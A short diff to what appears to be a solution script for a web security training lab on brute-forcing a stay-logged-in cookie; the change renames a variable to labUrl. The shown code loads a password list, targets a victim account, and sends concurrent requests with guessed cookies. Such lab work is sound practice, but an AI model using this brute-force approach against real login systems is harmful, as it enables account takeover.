@@ -4,7 +4,7 @@ import { runTasks } from "../../../utils/runTasks.js";
 import { getPasswords } from "../../../utils/config.js";
 import { victimsAccount } from "../../../../config/accounts.js";
 
-const { url, concurrencyLimit, httpClient } = getParsedInput({
+const { labUrl, concurrencyLimit, httpClient } = getParsedInput({
   description: "Lab: Brute-forcing a stay-logged-in cookie",
   concurrency: true,
   proxy: true,
@@ -13,7 +13,7 @@ const { url, concurrencyLimit, httpClient } = getParsedInput({
 const passwords = await getPasswords();
 
 async function task(password) {
-  const resp = await httpClient.get(url, {
+  const resp = await httpClient.get(labUrl, {
     headers: {
       cookie: getCookie(password),
     },
